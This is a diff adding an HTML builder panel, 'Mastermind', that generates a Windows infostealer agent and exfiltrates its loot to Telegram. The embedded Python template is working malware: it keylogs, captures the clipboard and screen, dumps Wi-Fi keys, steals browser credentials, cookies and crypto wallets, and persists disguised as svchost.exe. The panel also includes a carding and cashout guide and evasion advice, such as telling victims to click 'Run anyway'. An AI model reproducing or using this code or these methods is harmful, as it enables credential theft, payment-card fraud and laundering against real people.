@@ -1,0 +1,769 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="theme-color" content="#0b0d10">
+<title>Mastermind</title>
+<style>
+*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+body{margin:0;background:#0b0d10;color:#cfd6dd;font:14px/1.5 ui-monospace,Menlo,Consolas,monospace}
+header{position:sticky;top:0;z-index:9;background:#0b0d10ee;backdrop-filter:blur(8px);border-bottom:1px solid #1c2229;padding:10px 12px 0}
+h1{margin:0 0 8px;font-size:15px;letter-spacing:.16em;color:#7dd3a0;font-weight:600}
+h1 small{color:#4a5560;letter-spacing:.05em;font-weight:400}
+nav{display:flex;gap:2px}
+nav button{flex:1;background:none;border:0;border-bottom:2px solid transparent;color:#63707c;padding:9px 2px;font:inherit;font-size:11.5px;letter-spacing:.1em;cursor:pointer}
+nav button.on{color:#7dd3a0;border-bottom-color:#7dd3a0}
+main{padding:14px 12px 60px;max-width:760px;margin:0 auto}
+section{display:none}section.on{display:block}
+label{display:block;font-size:11px;letter-spacing:.09em;color:#7a8794;margin:14px 0 5px;text-transform:uppercase}
+input,textarea{width:100%;background:#12171d;border:1px solid #232b34;color:#dfe6ec;border-radius:6px;padding:11px;font:inherit;font-size:13px}
+input:focus,textarea:focus{outline:0;border-color:#7dd3a0}
+button.b{width:100%;background:#7dd3a0;color:#07120c;border:0;border-radius:6px;padding:13px;font:inherit;font-weight:700;font-size:13px;letter-spacing:.06em;margin-top:14px;cursor:pointer}
+button.b:active{opacity:.75}
+button.g{background:#12171d;color:#cfd6dd;border:1px solid #232b34;font-weight:400;margin-top:8px}
+.hint{font-size:11.5px;color:#5f6c78;margin:6px 0 0}
+.card{background:#10151a;border:1px solid #1d242c;border-radius:8px;padding:12px;margin:10px 0}
+.card h3{margin:0 0 6px;font-size:12px;color:#7dd3a0;letter-spacing:.08em}
+.row{display:flex;gap:8px}.row>*{flex:1}
+details{border:1px solid #1d242c;border-radius:8px;margin:8px 0;background:#10151a}
+summary{padding:12px;cursor:pointer;color:#9fe8bd;font-size:12.5px;letter-spacing:.04em}
+details[open] summary{border-bottom:1px solid #1d242c}
+details .in{padding:12px;font-size:12.5px;color:#a8b4c0}
+details .in b{color:#dfe6ec}
+details .in code{background:#1a2129;padding:1px 5px;border-radius:3px;color:#7dd3a0}
+ul{padding-left:18px;margin:6px 0}li{margin:4px 0}
+.tag{display:inline-block;font-size:10px;padding:2px 7px;border-radius:3px;background:#1a2129;color:#7a8794;letter-spacing:.06em}
+.tag.live{background:#12301f;color:#7dd3a0}
+.item{border:1px solid #1d242c;border-radius:7px;padding:10px;margin:8px 0;background:#10151a}
+.item .meta{font-size:11px;color:#5f6c78;display:flex;justify-content:space-between;gap:8px}
+.item .cap{font-size:12px;color:#a8b4c0;margin:7px 0;word-break:break-word;white-space:pre-wrap}
+.item button{background:#7dd3a0;color:#07120c;border:0;border-radius:5px;padding:8px 14px;font:inherit;font-size:11.5px;font-weight:700;cursor:pointer}
+.chk{display:flex;gap:10px;align-items:flex-start;padding:9px 0;border-bottom:1px solid #171d24;font-size:12.5px}
+.chk input{width:19px;height:19px;flex:none;accent-color:#7dd3a0;margin-top:1px}
+.chk.done{color:#5f6c78;text-decoration:line-through}
+.ok{color:#7dd3a0}.warn{color:#e8b45f}.bad{color:#e87f7f}
+pre{background:#0e1318;border:1px solid #1d242c;border-radius:6px;padding:10px;overflow:auto;font-size:11px;color:#9fe8bd}
+hr{border:0;border-top:1px solid #1a2129;margin:18px 0}
+</style>
+</head>
+<body>
+<header>
+  <h1>MASTERMIND <small>// local build</small></h1>
+  <nav>
+    <button data-t="build" class="on">BUILD</button>
+    <button data-t="inbox">INBOX</button>
+    <button data-t="play">PLAY</button>
+    <button data-t="opsec">OPSEC</button>
+  </nav>
+</header>
+<main>
+
+<section id="build" class="on">
+  <p class="hint">One bot per campaign. Token and chat ID live only in this phone's storage and in the exe you build.</p>
+
+  <details><summary>1. Create the bot (once per campaign)</summary>
+  <div class="in">
+    <ul>
+      <li>Open <b>@BotFather</b> in Telegram, send <code>/newbot</code>.</li>
+      <li>Give it a name, then a username ending in <code>bot</code>.</li>
+      <li>Copy the token it returns.</li>
+      <li>Send <code>/setjoingroups</code> &rarr; Disable, so nobody can pull it into a group.</li>
+      <li>Send <code>/setprivacy</code> &rarr; Enable.</li>
+      <li>Open your new bot, tap <b>START</b>. It cannot message you otherwise.</li>
+    </ul>
+  </div></details>
+
+  <label>Bot token</label>
+  <input id="token" placeholder="123456789:AAH..." autocomplete="off" spellcheck="false">
+  <button class="b g" onclick="grabChat()">FETCH CHAT ID FROM BOT</button>
+  <p class="hint" id="chatmsg">Tap START on the bot, then tap above.</p>
+
+  <label>Chat ID</label>
+  <input id="chat" placeholder="auto-filled" autocomplete="off">
+
+  <label>Zip password (you need this to open every package)</label>
+  <input id="zipPw" placeholder="four random words" autocomplete="off">
+
+  <label>Hardened mode (optional) &mdash; Cloudflare Worker URL</label>
+  <input id="worker" placeholder="https://xxx.workers.dev" autocomplete="off" spellcheck="false">
+  <label>Worker HMAC secret</label>
+  <input id="secret" placeholder="long random string" autocomplete="off" spellcheck="false">
+
+  <label>SMTP fallback (optional, Gmail app password)</label>
+  <input id="smtpPw" placeholder="16 chars &mdash; blank to disable" autocomplete="off">
+
+  <button class="b" onclick="gen()">GENERATE agent.py</button>
+  <button class="b g" onclick="genWorker()">DOWNLOAD worker.js</button>
+  <button class="b g" onclick="wipe()">CLEAR SAVED CONFIG</button>
+  <p class="hint">Generated file lands in Downloads. Push it to GitHub, let Actions build the exe, done.</p>
+</section>
+
+<section id="inbox">
+  <div class="row">
+    <button class="b" onclick="pull()">REFRESH</button>
+    <button class="b g" onclick="clearHist()">CLEAR</button>
+  </div>
+  <p class="hint" id="status">Idle. Telegram keeps only 24h of history &mdash; pull daily.</p>
+  <div id="feed"></div>
+</section>
+
+<section id="play">
+  <p class="hint">Read once, properly. Most losses are operator error, not bad data.</p>
+
+  <details><summary>Data classes and what they actually trade for</summary><div class="in">
+    <ul>
+      <li><b>CC + exp + CVV only</b> &mdash; $1&ndash;8. Disposable.</li>
+      <li><b>+ name / address / zip</b> &mdash; AVS-capable, $8&ndash;18.</li>
+      <li><b>+ SSN / DOB / MMN</b> &mdash; full fullz, $15&ndash;40.</li>
+      <li><b>+ email or bank login (a "log")</b> &mdash; premium, because it beats OTP.</li>
+      <li><b>Session cookies</b> &mdash; highest value. A live session skips 3DS entirely.</li>
+      <li><b>Non-VBV / auto-VBV BIN</b> &mdash; the only thing that matters for volume. A perfect card on a 3DS-locked BIN is paper.</li>
+    </ul>
+    <p>Keystroke logs and clipboard are how you find the OTP window and the email password. Never cash a card whose BIN you haven't checked.</p>
+  </div></details>
+
+  <details><summary>Validation before you touch anything</summary><div class="in">
+    <ul>
+      <li><b>BIN lookup first.</b> Card type, level, country, bank, 3DS enrolment. If it's 3DS/OTP, park it unless you hold the email.</li>
+      <li><b>Live check</b> &mdash; $0.50&ndash;1 auth on a merchant with soft declines. "Live" means approved <i>and</i> AVS response captured.</li>
+      <li><b>AVS</b> &mdash; full match or full non-avs only. Partial match is merchant lottery.</li>
+      <li><b>Geo</b> &mdash; proxy state must equal cardholder state. Same city is better. Different country is a dead card.</li>
+    </ul>
+  </div></details>
+
+  <details><summary>Cashout routes, easiest to hardest</summary><div class="in">
+    <p><span class="tag">low value</span> <b>Gift cards / digital goods</b> &mdash; Amazon, Apple, Steam, Netflix. Instant, one shot, 40&ndash;60% resale. Burns the card immediately; good for clearing volume.</p>
+    <p><span class="tag">low risk</span> <b>Bill pay / utilities</b> &mdash; near-zero decline rate, thin margin. Good for laundering small balances.</p>
+    <p><span class="tag">needs identity</span> <b>PayPal / Cash App sends</b> &mdash; needs a warmed account and a fullz. Dies in hours.</p>
+    <p><span class="tag">high ticket</span> <b>Flights and hotels</b> &mdash; biggest single tickets, needs exact identity match. Non-refundable, so one mistake is total loss.</p>
+    <p><span class="tag">best resale</span> <b>Physical goods to a drop</b> &mdash; 70&ndash;85%. Drop address in the cardholder's state, 3&ndash;7 days to land.</p>
+    <p><span class="tag">hardware</span> <b>ATM with a cloned card</b> &mdash; best per-card return, needs MSR605X + blanks. PIN comes from track 2 or the fullz.</p>
+  </div></details>
+
+  <details><summary>Operating rules that decide the outcome</summary><div class="in">
+    <ul>
+      <li><b>One card, one merchant, one session.</b> Never a second order on a used card.</li>
+      <li><b>Residential SOCKS5 in the cardholder's state.</b> Datacenter IPs are flagged by every decent fraud engine.</li>
+      <li><b>Fresh antidetect profile per card.</b> Timezone, UA, WebRTC, canvas must agree with the proxy.</li>
+      <li><b>Billing exactly as on file.</b> Shipping can be a drop; billing cannot be guessed.</li>
+      <li><b>Stay under $300</b> on a merchant you haven't worked. Above that is manual review.</li>
+      <li><b>Two to four orders per hour</b> per IP block. Faster looks like a bot.</li>
+      <li><b>Use your own catch-all email</b> on the order, never the victim's &mdash; the victim can't cancel what they can't see.</li>
+    </ul>
+  </div></details>
+
+  <details><summary>Kill signals &mdash; when to walk away</summary><div class="in">
+    <ul>
+      <li>Three consecutive declines on one card: card dead or IP burned. Stop.</li>
+      <li><span class="bad">Do not honor</span> &mdash; velocity or geo mismatch. Change proxy before retrying.</li>
+      <li><span class="warn">AVS mismatch</span> &mdash; move to an AVS-off merchant.</li>
+      <li>Bank suddenly pushes OTP &mdash; BIN is 3DS-locked. Park it, don't burn attempts.</li>
+      <li>Merchant shows a captcha on checkout &mdash; profile is dirty. Rebuild it.</li>
+    </ul>
+  </div></details>
+
+  <details><summary>The 24-hour rule and your first hour</summary><div class="in">
+    <p>Card half-life is hours to days, and it's shortest on the best BINs because everyone hits them. Sort your batch by BIN quality the moment a package lands, and cash the top three inside the first hour. Everything below the line gets sold as logs instead of worked.</p>
+    <p>First hour, in order: decrypt package &rarr; BIN-check every card &rarr; tag non-VBV &rarr; pull matching proxies &rarr; work the top three &rarr; sell the remainder.</p>
+  </div></details>
+
+  <details><summary>Sell or cash?</summary><div class="in">
+    <p>Selling logs on Telegram markets returns 30&ndash;50% of face with no tooling. Cashing returns more but needs proxies, an antidetect browser, drop addresses and checker credits. Correct first move: sell the first batch, buy the tooling out of it, then start cashing. Don't cash on a residential connection with a stock browser.</p>
+  </div></details>
+</section>
+
+<section id="opsec">
+  <p class="hint">Tap to tick. Persists on this device only.</p>
+  <div id="chk"></div>
+  <hr>
+  <div class="card"><h3>TRACK COVERING</h3>
+    <ul>
+      <li>Bot on a <b>burner Telegram account</b> and a second SIM or eSIM. Never your real number.</li>
+      <li>Every upload goes out with <code>protect_content</code> set &mdash; no forwarding, no saving from chat.</li>
+      <li>Pull loot to phone storage and open it in place. Don't forward it to Saved Messages.</li>
+      <li><b>Rotate the bot token</b> between campaigns. In direct mode anyone holding an old exe holds your token.</li>
+      <li>Worker mode keeps the token off the binary; rotate the HMAC secret to kill old builds without rebuilding.</li>
+      <li>Delete the bot with <code>/deletebot</code> when a campaign closes.</li>
+      <li>Zip password never goes in the same channel as the zip.</li>
+    </ul>
+  </div>
+  <div class="card"><h3>PAYLOAD HYGIENE</h3>
+    <ul>
+      <li>One exe per campaign, never recycled across targets.</li>
+      <li>Rebuild from a fresh repo so the artifact has no shared history.</li>
+      <li>Expect Defender flags &mdash; "More info &rarr; Run anyway" is the script for the target.</li>
+      <li>Check the VM flag in <code>info.json</code>. <code>VM</code> means you're on a sandbox and the sample may have been detonated.</li>
+    </ul>
+  </div>
+</section>
+
+</main>
+
+<script type="text/plain" id="agentTpl">
+#!/usr/bin/env python3
+"""SysCache - blind collector. Telegram exfil, AES-256 packages, HKCU persistence."""
+
+import os, sys, time, json, random, shutil, socket, sqlite3, subprocess, threading
+import tempfile, ctypes, ctypes.wintypes, hashlib, hmac, platform, urllib.request
+from datetime import datetime
+from email.message import EmailMessage
+import smtplib, ssl
+
+try:
+    import pyzipper
+except ImportError:
+    pyzipper = None
+
+CFG = {
+    "token":  "{{TOKEN}}",
+    "chat":   "{{CHAT}}",
+    "worker": "{{WORKER}}",
+    "secret": "{{SECRET}}",
+    "smtp_pw": "{{SMTP_PW}}",
+    "smtp_user": "emolette343@gmail.com",
+    "zip_pw": "{{ZIP_PW}}",
+}
+
+APPDATA      = os.environ.get("APPDATA", os.path.expanduser("~"))
+LOCALAPPDATA = os.environ.get("LOCALAPPDATA", APPDATA)
+INSTALL_DIR  = os.path.join(APPDATA, "SysCache")
+INSTALL_EXE  = os.path.join(INSTALL_DIR, "svchost.exe")
+WORK         = os.path.join(INSTALL_DIR, "w")
+LOG          = os.path.join(INSTALL_DIR, "svc.log")
+NO_WIN       = 0x08000000
+BUDGET       = [10 * 1024 * 1024]
+LIMIT        = 15 * 1024 * 1024
+
+_lock = threading.Lock()
+_buf  = []
+
+def log(m):
+    try:
+        os.makedirs(INSTALL_DIR, exist_ok=True)
+        with open(LOG, "a", encoding="utf-8", errors="ignore") as f:
+            f.write("[%s] %s\n" % (datetime.now().strftime("%H:%M:%S"), m))
+    except Exception:
+        pass
+
+def mid():
+    raw = "%s|%s|%s" % (platform.node(), os.environ.get("USERNAME", ""), platform.machine())
+    return hashlib.sha1(raw.encode()).hexdigest()[:8].upper()
+
+def mutex(name):
+    ctypes.windll.kernel32.CreateMutexW(None, False, name)
+    return ctypes.windll.kernel32.GetLastError() != 183
+
+def ps(cmd, timeout=45):
+    try:
+        r = subprocess.run(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass",
+                            "-Command", cmd], capture_output=True, text=True,
+                           timeout=timeout, creationflags=NO_WIN)
+        return (r.stdout or "") + (r.stderr or "")
+    except Exception:
+        return ""
+
+# --------------------------------------------------------------- keyboard
+SHIFT_MAP = {"1":"!","2":"@","3":"#","4":"$","5":"%","6":"^","7":"&","8":"*","9":"(",
+             "0":")","-":"_","=":"+","[":"{","]":"}","\\":"|",";":":","'":'"',
+             ",":"<",".":">","/":"?"}
+SPECIAL = {8:"[BKSP]",9:"[TAB]",13:"[ENTER]",27:"[ESC]",46:"[DEL]",37:"[LEFT]",
+           38:"[UP]",39:"[RIGHT]",40:"[DOWN]",35:"[END]",36:"[HOME]",33:"[PGUP]",
+           34:"[PGDN]",45:"[INS]",20:"[CAPS]",0x5B:"[WIN]",0x5D:"[MENU]"}
+
+def vk_to_str(vk):
+    if 0x70 <= vk <= 0x87:
+        return "[F%d]" % (vk - 0x6F)
+    if vk in SPECIAL:
+        return SPECIAL[vk]
+    ch = ctypes.windll.user32.MapVirtualKeyW(vk, 2)
+    if not ch:
+        return ""
+    ch = chr(ch)
+    shifted = bool(ctypes.windll.user32.GetAsyncKeyState(0x10) & 0x8000)
+    caps    = bool(ctypes.windll.user32.GetKeyState(0x14) & 1)
+    if ch.isalpha():
+        return ch.upper() if (shifted ^ caps) else ch.lower()
+    if shifted:
+        return SHIFT_MAP.get(ch, ch)
+    return ch
+
+class KB(ctypes.Structure):
+    _fields_ = [("vk", ctypes.wintypes.DWORD), ("sc", ctypes.wintypes.DWORD),
+                ("fl", ctypes.wintypes.DWORD), ("tm", ctypes.wintypes.DWORD),
+                ("ex", ctypes.POINTER(ctypes.c_ulong))]
+
+LRESULT  = ctypes.c_ssize_t
+HOOKPROC = ctypes.WINFUNCTYPE(LRESULT, ctypes.c_int, ctypes.wintypes.WPARAM,
+                              ctypes.wintypes.LPARAM)
+
+def title():
+    try:
+        h = ctypes.windll.user32.GetForegroundWindow()
+        n = ctypes.windll.user32.GetWindowTextLengthW(h)
+        if n <= 0:
+            return ""
+        b = ctypes.create_unicode_buffer(n + 1)
+        ctypes.windll.user32.GetWindowTextW(h, b, n + 1)
+        return b.value[:120]
+    except Exception:
+        return ""
+
+class Keylogger(threading.Thread):
+    def __init__(self):
+        super().__init__(daemon=True)
+        self.cur = ""
+        self.proc = HOOKPROC(self.cb)
+
+    def cb(self, code, wp, lp):
+        if code == 0 and wp in (0x100, 0x104):
+            try:
+                k = ctypes.cast(lp, ctypes.POINTER(KB)).contents
+                t = title()
+                with _lock:
+                    if t != self.cur:
+                        self.cur = t
+                        _buf.append("\n\n--- [%s] ---\n" % t)
+                    s = vk_to_str(k.vk)
+                    if s:
+                        _buf.append(s)
+            except Exception:
+                pass
+        return ctypes.windll.user32.CallNextHookEx(None, code, wp, lp)
+
+    def run(self):
+        ctypes.windll.user32.SetWindowsHookExW(13, self.proc,
+            ctypes.windll.kernel32.GetModuleHandleW(None), 0)
+        m = ctypes.wintypes.MSG()
+        while ctypes.windll.user32.GetMessageW(ctypes.byref(m), None, 0, 0) != 0:
+            ctypes.windll.user32.TranslateMessage(ctypes.byref(m))
+            ctypes.windll.user32.DispatchMessageW(ctypes.byref(m))
+
+def drain():
+    with _lock:
+        s = "".join(_buf)
+        _buf.clear()
+    return s
+
+def clip():
+    last = ""
+    while True:
+        try:
+            if ctypes.windll.user32.OpenClipboard(None):
+                if ctypes.windll.user32.IsClipboardFormatAvailable(13):
+                    h = ctypes.windll.user32.GetClipboardData(13)
+                    p = ctypes.windll.kernel32.GlobalLock(h)
+                    if p:
+                        t = ctypes.wstring_at(p)
+                        ctypes.windll.kernel32.GlobalUnlock(h)
+                        if t and t != last:
+                            last = t
+                            with _lock:
+                                _buf.append("\n[CLIP] %s\n" % t[:1500])
+                ctypes.windll.user32.CloseClipboard()
+        except Exception:
+            pass
+        time.sleep(1.0)
+
+# ---------------------------------------------------------------- collect
+def take(src, dd, cap=3 * 1024 * 1024):
+    out = None
+    try:
+        if not os.path.isfile(src):
+            return
+        sz = os.path.getsize(src)
+        if sz == 0 or sz > cap or sz > BUDGET[0]:
+            return
+        os.makedirs(dd, exist_ok=True)
+        out = os.path.join(dd, os.path.basename(src))
+        i = 1
+        while os.path.exists(out):
+            out = os.path.join(dd, "%s_%d" % (os.path.basename(src), i)); i += 1
+        shutil.copy2(src, out)
+        BUDGET[0] -= sz
+    except Exception:
+        if not out:
+            return
+        try:
+            s = sqlite3.connect("file:%s?mode=ro" % src.replace("\\", "/"), uri=True, timeout=3)
+            d = sqlite3.connect(out); s.backup(d); d.close(); s.close()
+            BUDGET[0] -= os.path.getsize(out)
+        except Exception:
+            pass
+
+def harvest():
+    BUDGET[0] = 10 * 1024 * 1024
+    d = os.path.join(WORK, datetime.now().strftime("%Y%m%d-%H%M%S"))
+    os.makedirs(d, exist_ok=True)
+
+    info = {"id": mid(), "host": platform.node(), "user": os.environ.get("USERNAME", ""),
+            "os": platform.platform(), "arch": platform.machine(),
+            "utc": datetime.utcnow().isoformat(), "lan": ""}
+    try:
+        info["lan"] = socket.gethostbyname(socket.gethostname())
+    except Exception:
+        pass
+    man = ps("(Get-CimInstance Win32_ComputerSystem).Manufacturer + (Get-CimInstance Win32_ComputerSystem).Model", 30).lower()
+    info["vm"] = "VM" if any(k in man for k in ("vmware","virtualbox","qemu","hyper-v","innotek")) else "bare"
+    info["av"] = ps("(Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct).displayName", 30).strip()
+    with open(os.path.join(d, "info.json"), "w", encoding="utf-8") as f:
+        json.dump(info, f, indent=1)
+
+    with open(os.path.join(d, "wifi.txt"), "w", encoding="utf-8", errors="ignore") as f:
+        p = subprocess.run(["netsh","wlan","show","profiles"], capture_output=True, text=True,
+                           creationflags=NO_WIN, timeout=25).stdout
+        f.write(p)
+        for line in p.splitlines():
+            if "All User Profile" in line and ":" in line:
+                nm = line.split(":", 1)[1].strip()
+                q = subprocess.run(["netsh","wlan","show","profile","name=%s" % nm, "key=clear"],
+                                   capture_output=True, text=True, creationflags=NO_WIN, timeout=20).stdout
+                f.write("\n==== %s ====\n%s" % (nm, q))
+
+    ps("Add-Type -AssemblyName System.Windows.Forms,System.Drawing;"
+       "$b=[System.Windows.Forms.SystemInformation]::VirtualScreen;"
+       "$i=New-Object System.Drawing.Bitmap $b.Width,$b.Height;"
+       "$g=[System.Drawing.Graphics]::FromImage($i);"
+       "$g.CopyFromScreen($b.Left,$b.Top,0,0,$i.Size);"
+       "$i.Save('%s');" % os.path.join(d, "screen.png").replace("\\", "\\\\"), 40)
+
+    for root in (os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data"),
+                 os.path.join(LOCALAPPDATA, "Microsoft", "Edge", "User Data"),
+                 os.path.join(LOCALAPPDATA, "BraveSoftware", "Brave-Browser", "User Data"),
+                 os.path.join(APPDATA, "Opera Software", "Opera Stable"),
+                 os.path.join(LOCALAPPDATA, "Vivaldi", "User Data")):
+        if not os.path.isdir(root):
+            continue
+        take(os.path.join(root, "Local State"), os.path.join(d, "browsers", "keys"))
+        for prof in os.listdir(root):
+            pd = os.path.join(root, prof)
+            if not os.path.isdir(pd):
+                continue
+            for fn in ("Login Data", "Web Data", "Cookies", "History", "Login Data For Account"):
+                take(os.path.join(pd, fn), os.path.join(d, "browsers", prof.replace(" ", "")))
+            take(os.path.join(pd, "Local Extension Settings", "nkbihfbeogaeaoehlefnkodbefgpgknn"),
+                 os.path.join(d, "browsers", prof.replace(" ", ""), "metamask"), 8 * 1024 * 1024)
+
+    ff = os.path.join(APPDATA, "Mozilla", "Firefox", "Profiles")
+    if os.path.isdir(ff):
+        for prof in os.listdir(ff):
+            for fn in ("logins.json", "key4.db", "cookies.sqlite", "places.sqlite"):
+                take(os.path.join(ff, prof, fn), os.path.join(d, "firefox", prof))
+
+    for w, cap in ((os.path.join(APPDATA, "Exodus", "exodus.wallet"), 8 * 1024 * 1024),
+                   (os.path.join(APPDATA, "Electrum", "wallets"), 4 * 1024 * 1024),
+                   (os.path.join(APPDATA, "Ethereum", "keystore"), 4 * 1024 * 1024),
+                   (os.path.join(APPDATA, "Bitcoin", "wallet.dat"), 4 * 1024 * 1024)):
+        if os.path.isdir(w):
+            for r, _, fs in os.walk(w):
+                for fn in fs:
+                    take(os.path.join(r, fn), os.path.join(d, "wallets"), cap)
+        else:
+            take(w, os.path.join(d, "wallets"), cap)
+
+    exts = (".txt",".pdf",".doc",".docx",".xls",".xlsx",".csv",".rtf",
+            ".kdbx",".ovpn",".rdp",".pem",".key",".ppk",".json")
+    n = 0
+    for base in ("Desktop", "Documents", "Downloads"):
+        p = os.path.join(os.path.expanduser("~"), base)
+        if not os.path.isdir(p):
+            continue
+        for r, _, fs in os.walk(p):
+            for fn in fs:
+                if n > 80 or BUDGET[0] < 400 * 1024:
+                    break
+                if fn.lower().endswith(exts):
+                    take(os.path.join(r, fn), os.path.join(d, "files", base), 2 * 1024 * 1024)
+                    n += 1
+
+    with open(os.path.join(d, "keystrokes.txt"), "w", encoding="utf-8", errors="ignore") as f:
+        f.write(drain())
+    return d
+
+def pack(d):
+    out = d + ".zip"
+    if pyzipper:
+        with pyzipper.AESZipFile(out, "w", compression=pyzipper.ZIP_DEFLATED,
+                                 encryption=pyzipper.WZ_AES) as z:
+            z.setpassword(CFG["zip_pw"].encode())
+            for r, _, fs in os.walk(d):
+                for fn in fs:
+                    p = os.path.join(r, fn)
+                    z.write(p, os.path.relpath(p, d))
+    else:
+        import zipfile
+        with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as z:
+            for r, _, fs in os.walk(d):
+                for fn in fs:
+                    p = os.path.join(r, fn)
+                    z.write(p, os.path.relpath(p, d))
+    shutil.rmtree(d, ignore_errors=True)
+    return out
+
+# ------------------------------------------------------------------- send
+def mp(fields, name, fname, data):
+    b = "----B" + hashlib.md5(os.urandom(16)).hexdigest()
+    out = b""
+    for k, v in fields.items():
+        out += ("--%s\r\nContent-Disposition: form-data; name=\"%s\"\r\n\r\n%s\r\n"
+                % (b, k, v)).encode()
+    out += ("--%s\r\nContent-Disposition: form-data; name=\"%s\"; filename=\"%s\"\r\n"
+            "Content-Type: application/octet-stream\r\n\r\n" % (b, name, fname)).encode()
+    out += data + b"\r\n" + ("--%s--\r\n" % b).encode()
+    return b, out
+
+def tg(subject, body, fname, data):
+    cap = (subject + "\n" + body)[:900]
+    fields = {"chat_id": CFG["chat"], "caption": cap, "protect_content": "true"}
+    b, body_bytes = mp(fields, "document", fname, data)
+    if CFG["worker"]:
+        url = CFG["worker"].rstrip("/") + "/up"
+    else:
+        url = "https://api.telegram.org/bot%s/sendDocument" % CFG["token"]
+    for att in range(4):
+        try:
+            req = urllib.request.Request(url, data=body_bytes, method="POST")
+            req.add_header("Content-Type", "multipart/form-data; boundary=" + b)
+            if CFG["worker"]:
+                req.add_header("X-Sig", hmac.new(CFG["secret"].encode(), body_bytes,
+                                                 hashlib.sha256).hexdigest())
+            with urllib.request.urlopen(req, timeout=120) as r:
+                return json.loads(r.read().decode())
+        except urllib.error.HTTPError as e:
+            try:
+                j = json.loads(e.read().decode())
+                wait = j.get("parameters", {}).get("retry_after", 15)
+            except Exception:
+                wait = 15
+            log("tg http %s" % e.code)
+            time.sleep(wait)
+        except Exception as e:
+            log("tg fail %r" % e)
+            time.sleep(20 * (att + 1))
+    return None
+
+def smtp_send(subject, body, fname, data):
+    if not CFG["smtp_pw"]:
+        return
+    try:
+        m = EmailMessage()
+        m["From"] = "SysCache <%s>" % CFG["smtp_user"]
+        m["To"] = CFG["smtp_user"]
+        m["Subject"] = subject
+        m.set_content(body)
+        m.add_attachment(data, maintype="application", subtype="octet-stream", filename=fname)
+        with smtplib.SMTP_SSL("smtp.gmail.com", 465,
+                              context=ssl.create_default_context(), timeout=90) as s:
+            s.login(CFG["smtp_user"], CFG["smtp_pw"])
+            s.send_message(m)
+    except Exception as e:
+        log("smtp fail %r" % e)
+
+def ship(zpath, tag):
+    try:
+        data = open(zpath, "rb").read()
+    except Exception:
+        return
+    try:
+        os.remove(zpath)
+    except Exception:
+        pass
+    base = "%s_%s" % (mid(), datetime.now().strftime("%Y%m%d-%H%M%S"))
+    note = "pw: %s" % CFG["zip_pw"]
+    if len(data) <= LIMIT:
+        if tg("[%s] %s" % (mid(), tag), note, base + ".zip", data) is None:
+            smtp_send("[%s] %s" % (mid(), tag), note, base + ".zip", data)
+        return
+    parts = [data[i:i + LIMIT] for i in range(0, len(data), LIMIT)]
+    for i, p in enumerate(parts, 1):
+        nm = "%s.part%02dof%02d" % (base, i, len(parts))
+        cap = "merge: cat *.part* > loot.zip | " + note
+        if tg("[%s] %s %d/%d" % (mid(), tag, i, len(parts)), cap, nm, p) is None:
+            smtp_send("[%s] %s %d/%d" % (mid(), tag, i, len(parts)), cap, nm, p)
+        time.sleep(2)
+
+def full(tag):
+    try:
+        ship(pack(harvest()), tag)
+    except Exception as e:
+        log("harvest fail %r" % e)
+
+# -------------------------------------------------------------- lifecycle
+def install():
+    try:
+        os.makedirs(INSTALL_DIR, exist_ok=True)
+        if not os.path.exists(INSTALL_EXE):
+            shutil.copy2(sys.argv[0], INSTALL_EXE)
+        subprocess.run(["reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+                        "/v", "SysCache", "/t", "REG_SZ", "/d", '"%s"' % INSTALL_EXE, "/f"],
+                       capture_output=True, creationflags=NO_WIN, timeout=20)
+        return True
+    except Exception as e:
+        log("install fail %r" % e)
+        return False
+
+def run():
+    threading.Thread(target=Keylogger, daemon=True).start()
+    threading.Thread(target=clip, daemon=True).start()
+    time.sleep(random.uniform(12, 40))
+    full("initial")
+    last = time.time()
+    while True:
+        time.sleep(300)
+        ks = drain()
+        if ks.strip():
+            full("keys")
+        if time.time() - last > 2700:
+            full("refresh")
+            last = time.time()
+
+def main():
+    if not sys.platform.startswith("win"):
+        return
+    if os.path.abspath(sys.argv[0]).lower() != INSTALL_EXE.lower():
+        if not mutex("Global\\SysCacheInst"):
+            return
+        if install():
+            subprocess.Popen([INSTALL_EXE], creationflags=0x00000008 | 0x00000200, close_fds=True)
+        time.sleep(2)
+        return
+    time.sleep(random.uniform(1, 3))
+    if not mutex("Global\\SysCacheRun"):
+        return
+    run()
+
+if __name__ == "__main__":
+    try:
+        main()
+    except Exception:
+        log("fatal")
+</script>
+
+<script>
+const $=s=>document.querySelector(s);
+const load=()=>JSON.parse(localStorage.getItem('mm.cfg')||'{}');
+const hist=()=>JSON.parse(localStorage.getItem('mm.hist')||'[]');
+let off=+(localStorage.getItem('mm.off')||0);
+
+document.querySelectorAll('nav button').forEach(b=>b.onclick=()=>{
+  document.querySelectorAll('nav button').forEach(x=>x.classList.remove('on'));
+  document.querySelectorAll('section').forEach(x=>x.classList.remove('on'));
+  b.classList.add('on');$('#'+b.dataset.t).classList.add('on');
+  if(b.dataset.t==='inbox')pull();
+});
+
+(function fill(){const c=load();['token','chat','zipPw','worker','secret','smtpPw'].forEach(k=>{if(c[k])$('#'+k).value=c[k]})})();
+
+function readForm(){const c={};['token','chat','zipPw','worker','secret','smtpPw'].forEach(k=>c[k]=$('#'+k).value.trim());return c}
+
+function dl(name,txt){const a=document.createElement('a');
+  a.href=URL.createObjectURL(new Blob([txt],{type:'text/plain'}));a.download=name;a.click()}
+
+function gen(){
+  const c=readForm();localStorage.setItem('mm.cfg',JSON.stringify(c));
+  if(!c.token||!c.chat||!c.zipPw){alert('token, chat id and zip password are required');return}
+  let s=$('#agentTpl').textContent;
+  for(const k in c) s=s.split('{{'+k.toUpperCase().replace('ZIPPW','ZIP_PW').replace('SMTPPW','SMTP_PW')+'}}').join(c[k]);
+  dl('agent.py',s);
+}
+
+function genWorker(){dl('worker.js',document.getElementById('wtpl').textContent)}
+
+function wipe(){localStorage.removeItem('mm.cfg');location.reload()}
+
+async function grabChat(){
+  const t=$('#token').value.trim();if(!t)return;
+  $('#chatmsg').textContent='checking...';
+  try{
+    const r=await fetch('https://api.telegram.org/bot'+t+'/getUpdates');
+    const j=await r.json();
+    if(!j.ok){$('#chatmsg').textContent='bad token: '+j.description;return}
+    let id=null;
